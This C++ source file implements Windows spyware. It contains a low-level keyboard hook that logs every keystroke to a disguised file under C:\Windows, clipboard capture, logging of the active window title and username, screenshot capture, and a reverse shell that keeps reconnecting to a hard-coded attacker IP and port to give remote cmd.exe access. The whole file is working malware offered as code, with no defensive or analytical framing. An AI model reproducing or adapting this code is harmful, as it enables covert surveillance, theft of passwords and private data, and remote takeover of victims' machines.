#include "Winkey.hpp"

HHOOK			key_hook;
HWINEVENTHOOK	win_hook;

FILE* file;

char	keys[2][256][20] = {
{
    "", "", "", "", "", "", "", "", "{BACKSPACE}", "{TAP}",
    "", "", "{CLEAR}", "{ENTER}", "", "", "{SHIFT}", "{CTRL}", "{ALT}", "{PAUSE}",
    "{CAPSLOCK}", "", "", "", "", "", "", "{ESC}", "", "",
    "", "", " ", "{PAGUP}", "{PAGDOWN}", "{END}", "{HOME}", "{LEFT}", "{UP}", "{RIGHT}",
    "{DOWN}", "{SELECT}", "{PRINT}", "{EXECUTE}", "{PRINTSCREEN}", "{INS}", "{DEL}", "{HELP}", "0", "1",
    "2", "3", "4", "5", "6", "7", "8", "9", "", "",
    "", "", "", "", "", "a", "b", "c", "d", "e",
    "f", "g", "h", "i", "j", "k", "l", "m", "n", "o",
    "p", "q", "r", "s", "t", "u", "v", "w", "x", "y",
    "z", "{LWIN}", "{RWIN}", "{APPKEY}", "", "{SLEEP}", "0", "1", "2", "3",
    "4", "5", "6", "7", "8", "9", "*", "+", "{SEP}", "-",
    ".", "/", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8",
    "F9", "F10", "F11", "F12", "F13", "F14", "F15", "F16", "F17", "F18",
    "F19", "F20", "F21", "F22", "F23", "F24", "", "", "", "",
    "", "", "", "", "{NUMLOCK}", "{SCROLLLOCK}", "", "", "", "",
    "", "", "", "", "", "", "", "", "", "",
    "{LSHIFT}", "{RSHIFT}", "{LCTRL}", "{RCTRL}", "{LALT}", "{RALT}", "", "" , "" , "" ,
    "" , "" , "" , "" , "" , "" , "" , "" , "" , "",
    "", "", "", "", "", "", "è", "+", ",", "-",
    ".", "ù", "ò", "", "", "", "", "", "", "",
    "", "", "", "", "", "", "", "", "", "",
    "", "", "", "", "", "", "", "", "", "'",
    "\\", "ì", "à", "", "", "", "<", "", "", "",
    "", "", "", "", "", "", "", "", "", "",
    "", "", "", "", "", "", "", "", "", "",
    "", "", "", "", "", ""
}, {
    "", "", "", "", "", "", "", "", "{BACKSPACE}", "{TAP}",
    "", "", "{CLEAR}", "{ENTER}", "", "", "{SHIFT}", "{CTRL}", "{ALT}", "{PAUSE}",
    "{CAPSLOCK}", "", "", "", "", "", "", "{ESC}", "", "",
    "", "", " ", "{PAGUP}", "{PAGDOWN}", "{END}", "{HOME}", "{LEFT}", "{UP}", "{RIGHT}",
    "{DOWN}", "{SELECT}", "{PRINT}", "{EXECUTE}", "{PRINTSCREEN}", "{INS}", "{DEL}", "{HELP}", "=", "!",
    "\"", "£", "$", "%", "&", "/", "(", ")", "", "",
    "", "", "", "", "", "A", "B", "C", "D", "E",
    "F", "G", "H", "I", "J", "K", "L", "M", "N", "O",
    "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y",
    "Z", "{LWIN}", "{RWIN}", "{APPKEY}", "", "{SLEEP}", "0", "1", "2", "3",
    "4", "5", "6", "7", "8", "9", "*", "+", "{SEP}", "-",
    ".", "/", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8",
    "F9", "F10", "F11", "F12", "F13", "F14", "F15", "F16", "F17", "F18",
    "F19", "F20", "F21", "F22", "F23", "F24", "", "", "", "",
    "", "", "", "", "{NUMLOCK}", "{SCROLLLOCK}", "", "", "", "",
    "", "", "", "", "", "", "", "", "", "",
    "{LSHIFT}", "{RSHIFT}", "{LCTRL}", "{RCTRL}", "{LALT}", "{RALT}", "", "" , "" , "" ,
    "" , "" , "" , "" , "" , "" , "" , "" , "" , "",
    "", "", "", "", "", "", "é", "*", ";", "_",
    ":", "§", "ç", "", "", "", "", "", "", "",
    "", "", "", "", "", "", "", "", "", "",
    "", "", "", "", "", "", "", "", "", "?",
    "|", "^", "°", "", "", "", ">", "", "", "",
    "", "", "", "", "", "", "", "", "", "",
    "", "", "", "", "", "", "", "", "", "",
    "", "", "", "", "", ""
}
};

Winkey::Winkey(void)
{
	return;
}

Winkey::~Winkey(void)
{
	return;
}

void	handle_sig(int sig)
{
    (void)sig;
    UnhookWindowsHookEx(key_hook);
    UnhookWinEvent(win_hook);
}

void	_clipboard(void)
{
    FILE* log;
    HGLOBAL	clip;
    LPVOID str;

    if (!OpenClipboard(0))
        return;
    clip = GetClipboardData(CF_TEXT);
    if (clip)
    {
        str = GlobalLock(clip);
        if (str)
        {
            fopen_s(&log, "C:\\Windows\\ClipBoard.txt", "a");
            fprintf_s(log, "\n{CLIPBOARD: %s}\n", str);
            fclose(log);
        }
        GlobalUnlock(clip);
    }
    CloseClipboard();
}

LRESULT CALLBACK	LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT	key = (PKBDLLHOOKSTRUCT)lParam;
    static char			shift = 0;
    FILE* log;

    if (nCode == HC_ACTION)
    {
        if (wParam == WM_KEYUP)
        {
            if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
                shift = 0;
        }
        if (wParam == WM_KEYDOWN)
        {
            if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
                shift = 1;
            fopen_s(&log, "C:\\Windows\\WinNT.txt", "a");
            fprintf_s(log, "%s", keys[shift][key->vkCode]);
            fclose(log);
            if (GetKeyState(VK_CONTROL) && key->vkCode == 'V')
                _clipboard();
        }
    }
    return (CallNextHookEx(key_hook, nCode, wParam, lParam));
}

void CALLBACK	Wineventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
    LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
{
    SYSTEMTIME	time;
    int			len;
    HLOCAL title;
    FILE* log;

    (void)hWinEventHook;
    (void)idObject;
    (void)idChild;
    (void)idEventThread;
    (void)dwmsEventTime;
    if (event != EVENT_SYSTEM_FOREGROUND)
        return;
    len = GetWindowTextLength(hwnd) + 1;
    title = LocalAlloc(LMEM_ZEROINIT, len);
    if (!title)
        return;
    GetSystemTime(&time);
    GetWindowText(hwnd, LPSTR(title), len);
    if (!title)
        return;

    WCHAR username[256];
    DWORD usernameLen = sizeof(username) / sizeof(username[0]);
    GetUserNameW(username, &usernameLen);

    fopen_s(&log, "C:\\Windows\\WinNT.txt", "a+");
    fprintf_s(log, "\n[%02d.%02d.%d %02d:%02d:%02d] - %ls - '%s'\n", time.wDay,
        time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond, username, title);
    fclose(log);
    LocalFree(title);
}

DWORD WINAPI _keyLogger(LPVOID lpParam)
{
    (void)lpParam;

    MSG		msg;
    HANDLE	thread;

    //signal(SIGINT, handle_sig);
    key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    win_hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0,
        Wineventproc, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
    CloseHandle(thread);
    while (GetMessage(&msg, 0, 0, 0));

    return 0;
}

void	Winkey::startKeylogger(void)
{
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_keyLogger), NULL, 0, NULL) == NULL) {
        std::cerr << "CreateThread failed!" << std::endl;
    }
	return;
}



void    Winkey::startclipBoard(void)
{
    return;
}

DWORD WINAPI _reverseShell(LPVOID lpParam)
{
    (void)lpParam;
    // listener ip, port on attacker's machine
    char* ip = "10.13.10.10";
    short port = 4444;

    WSADATA wsaData;
    SOCKET wSock;
    sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    while (true) {
        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            // Handle WSAStartup failure
            std::cerr << "WSAStartup failed!" << std::endl;
            Sleep(1000);  // Sleep before retrying
            continue;     // Retry the connection
        }

        // Create socket
        wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        if (wSock == INVALID_SOCKET) {
            //std::cerr << "Failed to create socket!" << std::endl;
            WSACleanup();
            Sleep(1000);  // Sleep before retrying
            continue;     // Retry the connection
        }

        hax.sin_family = AF_INET;
        hax.sin_port = htons(port);
        hax.sin_addr.s_addr = inet_addr(ip);

        // Connect to remote host
        if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            std::cerr << "Failed to connect to remote host!" << std::endl;
            closesocket(wSock);
            WSACleanup();
            Sleep(1000);  // Sleep before retrying
            continue;     // Retry the connection
        }

        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = STARTF_USESTDHANDLES;
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

        // Start cmd.exe with redirected streams
        if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi)) {
            // Wait for the shell process to exit
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        // Cleanup and retry after a delay
        closesocket(wSock);
        WSACleanup();
        Sleep(1000);  // Sleep before retrying
    }
}

void	Winkey::startReverseShell(void)
{
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_reverseShell), NULL, 0, NULL) == NULL) {
        std::cerr << "CreateThread failed!" << std::endl;
    }
	return;
}

BOOL WINAPI _saveBitmap(LPVOID lpParam)
{
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    //HANDLE /*hHeap*/ = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    WCHAR* wPath;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);


    (void)lpParam;

    wPath = SCREEN_PATH;
    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);


    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);

        return FALSE;
    }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    return TRUE;
}

void Winkey::startCaptureScreen(void)
{
    if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(_saveBitmap), NULL, 0, NULL) == NULL) {
        std::cerr << "CreateThread failed!" << std::endl;
    }
    return;
}